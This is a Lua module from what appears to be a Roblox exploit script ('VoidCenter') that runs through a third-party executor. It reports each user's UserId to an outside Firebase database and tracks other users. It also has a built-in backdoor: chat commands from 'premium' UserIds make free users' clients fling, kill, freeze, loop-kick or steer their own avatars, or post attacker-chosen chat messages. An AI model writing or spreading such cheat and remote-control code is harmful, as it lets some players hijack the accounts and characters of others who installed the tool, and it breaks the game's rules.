-- ── VoidCenter: Detection + P2P module ─────────────────────
local _VC = getgenv()._VC
local LP             = _VC.LP
local Players        = _VC.Players
local RunService     = _VC.RunService
local Debris         = _VC.Debris
local C              = _VC.C
local N              = _VC.N
local Config         = _VC.Config
local IsPremium      = _VC.IsPremium
local premIds        = _VC.premIds
local Notify         = _VC.Notify
local FindPlayer     = _VC.FindPlayer
local PStr           = _VC.PStr
local Reg            = _VC.Reg
local RefreshActive  = _VC.RefreshActive
local Screen         = _VC.Screen
local UserInputService = _VC.UserInputService

-- VOID USER DETECTION  (whitelist-based, no cross-client needed)
-- ─────────────────────────────────────────────────────────
-- Since every script loads the same two GitHub lists, we
-- already know exactly who has the script and what tier
-- they are. We just scan the player list on load and watch
-- PlayerAdded for new joiners. No chat, no parts, nothing.
--
-- P2P SIGNALS still use invisible chat (confirmed working)
-- for premium commands. Detection itself needs nothing.
-- ═══════════════════════════════════════════════════════════

local vcUsers = {}   -- [player] = { premium = bool }

local function IsVoidUser(p) return vcUsers[p] ~= nil end

local function IsWhitelisted(player)
    -- Everyone running the script is considered a VC user.
    -- Premium check is separate (premIds only).
    return vcUsers[player] ~= nil
end

-- ── Tags ──────────────────────────────────────────────────────
local tagData = {}

local function RemoveTag(p)
    if tagData[p] then pcall(function() tagData[p]:Destroy() end) tagData[p] = nil end
end

local function MakeTag(player)
    if player == LP then return end
    local ch   = player.Character
    if not ch then return end
    -- Use WaitForChild so we don't bail out if HRP isn't ready yet
    local root = ch:FindFirstChild("HumanoidRootPart")
        or ch:WaitForChild("HumanoidRootPart", 5)
    if not root then return end
    RemoveTag(player)

    local info = vcUsers[player]
    local prem = info and info.premium == true
    local acC  = prem and Color3.fromRGB(255, 210, 50) or Color3.fromRGB(140, 45, 255)

    local bill = Instance.new("BillboardGui")
    bill.Name                  = "VTag_"..player.Name
    bill.Size                  = UDim2.new(0, 12, 0, 12)
    bill.StudsOffsetWorldSpace = Vector3.new(0, 3.5, 0)
    bill.AlwaysOnTop           = true
    bill.LightInfluence        = 0
    bill.MaxDistance           = 0
    bill.Parent                = root

    local dot = Instance.new("Frame")
    dot.BackgroundColor3 = acC
    dot.BorderSizePixel  = 0
    dot.Size             = UDim2.new(1, 0, 1, 0)
    dot.Parent           = bill
    Instance.new("UICorner", dot).CornerRadius = UDim.new(1, 0)

    tagData[player] = bill
end

-- Register a player as a VC user based on whitelist tier
local function RegisterIfWhitelisted(player)
    -- Name kept for compatibility but now registers ALL players — free tier is open.
    -- Premium is determined solely by premIds.
    if player == LP then return end
    local isPrem = premIds[player.UserId] == true

    local prev = vcUsers[player]
    vcUsers[player] = { premium = isPrem }

    if not prev or prev.premium ~= isPrem
    or not tagData[player] or not tagData[player].Parent then
        if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
            MakeTag(player)
        end
    end
    -- Rebuild tag when they respawn — always reconnect, not just on first registration
    if not prev then
        player.CharacterAdded:Connect(function(char)
            -- Wait for HumanoidRootPart to exist before tagging
            char:WaitForChild("HumanoidRootPart", 10)
            task.wait(0.5)
            if vcUsers[player] then MakeTag(player) end
        end)
    end
end

-- ═══════════════════════════════════════════════════════════
-- FIREBASE DETECTION
-- ─────────────────────────────────────────────────────────
-- On load: POST our UserId into Firebase under this JobId.
-- Every 10s: GET the list of UserIds in this JobId from
-- Firebase, match against players in server, tag VC users.
-- On leave: DELETE our entry so we don't show as online.
-- ═══════════════════════════════════════════════════════════

local FB_URL  = "https://voidcenter-a8d06-default-rtdb.firebaseio.com/"
local JOB_ID  = game.JobId ~= "" and game.JobId or "studio"
local MY_ID   = tostring(LP.UserId)
local MY_NODE = FB_URL .. "servers/" .. JOB_ID .. "/" .. MY_ID .. ".json"
local JOB_NODE= FB_URL .. "servers/" .. JOB_ID .. ".json"

-- http helper — returns body string or nil
local function http(method, url, body)
    local ok, res = pcall(function()
        return game:HttpGet(url) -- fallback for GET
    end)
    -- Use syn.request / request / http_request depending on executor
    local reqFn = syn and syn.request
               or (request ~= nil and request)
               or (http_request ~= nil and http_request)
               or nil
    if reqFn then
        local ok2, res2 = pcall(reqFn, {
            Url    = url,
            Method = method,
            Headers= {["Content-Type"] = "application/json"},
            Body   = body or "",
        })
        if ok2 and res2 then return res2.Body end
    elseif method == "GET" and ok then
        return res
    end
    return nil
end

-- Check in: write our UserId + premium flag to Firebase
local function CheckIn()
    local isPrem = IsPremium() and "true" or "false"
    local body   = '{"uid":'..MY_ID..',"prem":'..isPrem..'}'
    http("PUT", MY_NODE, body)
end

-- Check out: remove our entry when we leave
local function CheckOut()
    http("DELETE", MY_NODE, "null")
end

-- Parse the Firebase response and update vcUsers + tags
local function ProcessSnapshot(body)
    if not body or body == "null" or body == "" then return end
    local ok, data = pcall(function()
        -- body is like: {"123":{"uid":123,"prem":false},"456":{"uid":456,"prem":true}}
        -- We extract uid and prem values with pattern matching
        local results = {}
        for uid, prem in body:gmatch('"uid":(%d+),"prem":(%a+)') do
            results[tonumber(uid)] = (prem == "true")
        end
        -- Also try reversed order just in case Firebase reorders keys
        for prem, uid in body:gmatch('"prem":(%a+),"uid":(%d+)') do
            results[tonumber(uid)] = (prem == "true")
        end
        return results
    end)
    if not ok or not data then return end

    -- Track who we saw this poll so we can remove stale users
    local seen = {}

    for uid, isPrem in pairs(data) do
        local uid_n = tonumber(uid)
        if uid_n ~= LP.UserId then
            -- Find the player in the server
            local player = Players:GetPlayerByUserId(uid_n)
            if player then
                seen[player] = true
                local prev = vcUsers[player]
                vcUsers[player] = { premium = isPrem }
                if not prev or prev.premium ~= isPrem
                or not tagData[player] or not tagData[player].Parent then
                    MakeTag(player)
                end
                -- Hook CharacterAdded for Firebase-discovered players
                -- so tag rebuilds instantly on reset without waiting for next poll
                if not prev then
                    player.CharacterAdded:Connect(function(char)
                        char:WaitForChild("HumanoidRootPart", 10)
                        task.wait(0.5)
                        if vcUsers[player] then MakeTag(player) end
                    end)
                end
            end
        end
    end

    -- Remove users who are no longer in Firebase (left the game)
    for p in pairs(vcUsers) do
        if not seen[p] then
            RemoveTag(p)
            vcUsers[p] = nil
        end
    end
end

-- Poll Firebase every 10 seconds
local function StartPolling()
    task.spawn(function()
        while true do
            task.wait(10)
            local body = http("GET", JOB_NODE, nil)
            ProcessSnapshot(body)
        end
    end)
end

-- Also do an immediate poll on load to catch existing users
local function InitialPoll()
    task.spawn(function()
        task.wait(2)  -- wait for our own check-in to land first
        local body = http("GET", JOB_NODE, nil)
        ProcessSnapshot(body)
    end)
end

-- Clean up on leave — use a polling check instead of events
-- since BindToClose and AncestryChanged are server/restricted only
task.spawn(function()
    while task.wait(15) do
        -- If player is no longer in game, check out
        if not Players:FindFirstChild(LP.Name) then
            pcall(CheckOut)
            break
        end
    end
end)

-- Start everything
CheckIn()
InitialPoll()
StartPolling()

-- Re-check-in after respawn so our entry stays fresh
LP.CharacterAdded:Connect(function()
    task.wait(1)
    CheckIn()
    -- Rebuild tags we already know about
    task.wait(0.5)
    for p in pairs(vcUsers) do
        if p.Character and p.Character:FindFirstChild("HumanoidRootPart") then
            MakeTag(p)
        end
    end
end)

Players.PlayerRemoving:Connect(function(p)
    RemoveTag(p)
    vcUsers[p] = nil
end)

-- ═══════════════════════════════════════════════════════════
-- P2P SIGNALS  (dot-commands in chat)
-- ─────────────────────────────────────────────────────────
-- Premium users type .fling Player1 etc. in Roblox chat.
-- The target's script watches all whitelisted premium players'
-- chat and executes the command locally on itself.
-- Only premium UserIds can send, only free UserIds are targets.
-- ═══════════════════════════════════════════════════════════

-- Dot-command prefix
local DOT = "."

-- Dummy SendSig so commands module doesn't error — not used anymore
local function SendSig() end

-- ── Execute a dot-command on ourselves ────────────────────────
local function HandleDotCmd(sender, cmd, targetName, extra)
    -- Sender must be premium
    if not premIds[sender.UserId] then return end
    -- We must be free (premium can't be targeted)
    if IsPremium() then return end
    -- Command must be targeting us (by name or display name)
    if targetName then
        local tn   = targetName:lower()
        local name = LP.Name:lower()
        local disp = LP.DisplayName:lower()
        -- exact username, exact displayname, partial username, partial displayname
        local match = (name == tn)
                   or (disp == tn)
                   or (name:find(tn, 1, true) ~= nil)
                   or (disp:find(tn, 1, true) ~= nil)
        if not match then return end
    end

    local c, r, hum
    local function gc()
        c   = LP.Character
        r   = c and c:FindFirstChild("HumanoidRootPart")
        hum = c and c:FindFirstChildOfClass("Humanoid")
    end

    if cmd == "fling" then
        gc() if not r then return end
        local bv = Instance.new("BodyVelocity")
        bv.MaxForce = Vector3.new(1e9,1e9,1e9)
        bv.Velocity = Vector3.new(math.random(-160,160),350,math.random(-160,160))
        bv.Parent = r
        Debris:AddItem(bv, 0.15)
        Notify("Signal","Flung by "..sender.DisplayName,"warning",3)

    elseif cmd == "bring" then
        gc()
        local sr = sender.Character and sender.Character:FindFirstChild("HumanoidRootPart")
        if r and sr then
            r.CFrame = sr.CFrame * CFrame.new(math.random(-4,4),0,math.random(-4,4))
        end
        Notify("Signal","Brought to "..sender.DisplayName,"info",3)

    elseif cmd == "bringall" then
        -- No target needed — affects all free users
        gc()
        local sr = sender.Character and sender.Character:FindFirstChild("HumanoidRootPart")
        if r and sr then
            r.CFrame = sr.CFrame * CFrame.new(math.random(-8,8),0,math.random(-8,8))
        end
        Notify("Signal","Brought (all) to "..sender.DisplayName,"info",3)

    elseif cmd == "kill" or cmd == "reset" then
        gc() if hum then hum.Health = 0 end
        Notify("Signal","Killed by "..sender.DisplayName,"error",3)

    elseif cmd == "freeze" then
        Config.ActiveCmds["Frozen"] = true RefreshActive() gc()
        if c then
            for _,p in ipairs(c:GetDescendants()) do
                if p:IsA("BasePart") then p.Anchored = true end
            end
            if hum then hum.PlatformStand = true end
        end
        Notify("Signal","Frozen by "..sender.DisplayName,"warning",4)

    elseif cmd == "unfreeze" then
        Config.ActiveCmds["Frozen"] = nil RefreshActive() gc()
        if c then
            for _,p in ipairs(c:GetDescendants()) do
                if p:IsA("BasePart") then p.Anchored = false end
            end
            if hum then hum.PlatformStand = false end
        end
        Notify("Signal","Unfrozen by "..sender.DisplayName,"info",3)

    elseif cmd == "kick" then
        if Config.ActiveCmds["Kicked"] then return end
        Config.ActiveCmds["Kicked"] = true RefreshActive()
        Notify("Signal","Kicked by "..sender.DisplayName,"error",4)
        task.spawn(function()
            while Config.ActiveCmds["Kicked"] do
                pcall(function()
                    gc()
                    if r   then r.CFrame   = CFrame.new(0,-9999,0) end
                    if hum then hum.Health = 0 end
                end)
                task.wait(0.08)
            end
        end)

    elseif cmd == "unkick" then
        Config.ActiveCmds["Kicked"] = nil RefreshActive()
        Notify("Signal","Kick stopped","info",3)

    elseif cmd == "control" or cmd == "ctrl" then
        if IsPremium() then return end
        if Config.ActiveCmds["Controlled"] then return end
        Config.ActiveCmds["Controlled"] = true RefreshActive() gc()
        -- Lock character in place
        if hum then hum.WalkSpeed = 0 hum.JumpPower = 0 end
        Notify("Signal", "Controlled by "..sender.DisplayName, "warning", 5)

    elseif cmd == "release" then
        Config.ActiveCmds["Controlled"] = nil RefreshActive() gc()
        -- Restore movement
        if hum then hum.WalkSpeed = 16 hum.JumpPower = 50 end
        Notify("Signal", "Control released", "info", 3)

    elseif cmd == "ctrlmove" then
        -- Sent by premium user's script every 0.1s with direction vector
        -- format: ctrlmove x z  (e.g. "ctrlmove 1 0" = move right)
        if not Config.ActiveCmds["Controlled"] then return end
        gc() if not hum or not r then return end
        local x = tonumber(extra:match("^([%-%.%d]+)")) or 0
        local z = tonumber(extra:match("^[%-%.%d]+ ([%-%.%d]+)")) or 0
        if x == 0 and z == 0 then
            hum:MoveTo(r.Position)
        else
            local spd = 16
            local dir = Vector3.new(x, 0, z).Unit
            hum:MoveTo(r.Position + dir * spd)
        end

    elseif cmd == "chat" then
        if not extra or extra == "" then return end
        -- Try new chat system first, fall back to legacy — never both
        local sent = false
        pcall(function()
            local tcs = game:GetService("TextChatService")
            if tcs.ChatVersion == Enum.ChatVersion.TextChatService then
                local ch = tcs.TextChannels:FindFirstChild("RBXGeneral")
                if ch then ch:SendAsync(extra) sent = true end
            end
        end)
        if not sent then
            pcall(function()
                local ev  = game:GetService("ReplicatedStorage"):FindFirstChild("DefaultChatSystemChatEvents")
                local sr2 = ev and ev:FindFirstChild("SayMessageRequest")
                if sr2 then sr2:FireServer(extra, "All") end
            end)
        end

    elseif cmd == "spin" then
        gc() if not r then return end
        local bav = Instance.new("BodyAngularVelocity")
        bav.MaxTorque = Vector3.new(0, 9e9, 0)
        bav.AngularVelocity = Vector3.new(0, 80, 0)
        bav.Parent = r
        Debris:AddItem(bav, 3)
        Notify("Signal", "Spun by "..sender.DisplayName, "warning", 3)

    elseif cmd == "explode" then
        gc() if not r then return end
        local dirs = {
            Vector3.new(1,1,0), Vector3.new(-1,1,0),
            Vector3.new(0,1,1), Vector3.new(0,1,-1),
            Vector3.new(1,1,1), Vector3.new(-1,1,-1),
        }
        for _, dir in ipairs(dirs) do
            local bv = Instance.new("BodyVelocity")
            bv.MaxForce = Vector3.new(1e9,1e9,1e9)
            bv.Velocity = dir.Unit * 120
            bv.Parent = r
            Debris:AddItem(bv, 0.12)
        end
        Notify("Signal", "Exploded by "..sender.DisplayName, "error", 3)

    elseif cmd == "follow" then
        -- Start a loop that walks us toward the sender every 0.1s
        if Config.ActiveCmds["Followed"] then return end
        Config.ActiveCmds["Followed"] = true
        RefreshActive()
        Notify("Signal", "Forced to follow "..sender.DisplayName, "warning", 4)
        task.spawn(function()
            while Config.ActiveCmds["Followed"] do
                pcall(function()
                    gc()
                    local sr = sender.Character and sender.Character:FindFirstChild("HumanoidRootPart")
                    if hum and sr and r then
                        hum:MoveTo(sr.Position)
                    end
                end)
                task.wait(0.1)
            end
        end)

    elseif cmd == "unfollow" then
        Config.ActiveCmds["Followed"] = nil
        RefreshActive()
        Notify("Signal", "Follow stopped", "info", 3)

    elseif cmd == "tp2me" then
        -- Teleport us to sender on a loop
        if Config.ActiveCmds["TP2Me"] then return end
        Config.ActiveCmds["TP2Me"] = true
        RefreshActive()
        Notify("Signal", "TP'd to "..sender.DisplayName, "warning", 4)
        task.spawn(function()
            while Config.ActiveCmds["TP2Me"] do
                pcall(function()
                    gc()
                    local sr = sender.Character and sender.Character:FindFirstChild("HumanoidRootPart")
                    if r and sr then
                        r.CFrame = sr.CFrame * CFrame.new(math.random(-3,3), 0, math.random(-3,3))
                    end
                end)
                task.wait(0.5)
            end
        end)

    elseif cmd == "untp2me" then
        Config.ActiveCmds["TP2Me"] = nil
        RefreshActive()
        Notify("Signal", "TP loop stopped", "info", 3)
    end
end

-- ── Parse a chat message for dot-commands ─────────────────────
local function OnChat(speaker, msg)
    if not msg or msg == "" then return end
    if not premIds[speaker.UserId] then return end  -- only premium senders

    -- Strip any "Name: " prefix that some chat systems prepend
    local clean = msg:match("^%S+:%s*(.+)$") or msg
    -- Must start with dot
    if clean:sub(1,1) ~= DOT then return end

    -- Split everything after the dot
    local body  = clean:sub(2):match("^%s*(.-)%s*$")  -- trim
    local parts = {}
    for w in body:gmatch("%S+") do table.insert(parts, w) end
    if #parts == 0 then return end

    local cmd        = parts[1]:lower()
    -- targetName is everything from part 2 up to but not including extra words
    -- For .chat the extra is words 3+, for everything else words 2 is target and 3+ is extra
    local targetName = parts[2] or nil
    local extra      = #parts >= 3 and table.concat(parts, " ", 3) or ""

    -- bringall has no target
    if cmd == "bringall" then
        HandleDotCmd(speaker, cmd, nil, "")
        return
    end

    if cmd ~= "" then
        HandleDotCmd(speaker, cmd, targetName, extra)
    end
end

-- ── Hook chat for dot-commands ───────────────────────────────
-- We use a debounce table to ensure each message is only
-- processed once regardless of how many chat hooks fire.
local recentMsgs = {}

local function OnChatDeduped(speaker, msg)
    if not msg or msg == "" then return end
    -- Build a key from sender + message — if we've seen it in the last 1s, skip
    local key = tostring(speaker.UserId) .. msg
    if recentMsgs[key] then return end
    recentMsgs[key] = true
    task.delay(1, function() recentMsgs[key] = nil end)
    task.spawn(OnChat, speaker, msg)
end

-- Hook legacy Chatted
local function WatchPlayer(player)
    if not premIds[player.UserId] then return end
    player.Chatted:Connect(function(msg)
        OnChatDeduped(player, msg)
    end)
end

for _, p in ipairs(Players:GetPlayers()) do
    if p ~= LP then WatchPlayer(p) end
end
Players.PlayerAdded:Connect(function(p)
    if p ~= LP then WatchPlayer(p) end
end)

-- Also hook TextChatService — deduped so it never fires twice
pcall(function()
    local tcs = game:GetService("TextChatService")
    if tcs.ChatVersion == Enum.ChatVersion.TextChatService then
        tcs.MessageReceived:Connect(function(msg)
            local src = msg and msg.TextSource
            if not src then return end
            local p = Players:GetPlayerByUserId(src.UserId)
            if not p or p == LP then return end
            if not premIds[p.UserId] then return end
            local raw = (msg.OriginalText ~= "") and msg.OriginalText or msg.Text
            OnChatDeduped(p, raw)
        end)
    end
end)


-- =========================================================
-- Export detection state for commands module
_VC.vcUsers         = vcUsers
_VC.IsVoidUser      = IsVoidUser
_VC.IsWhitelisted   = IsWhitelisted
_VC.SendSig         = SendSig
_VC.tagData         = tagData
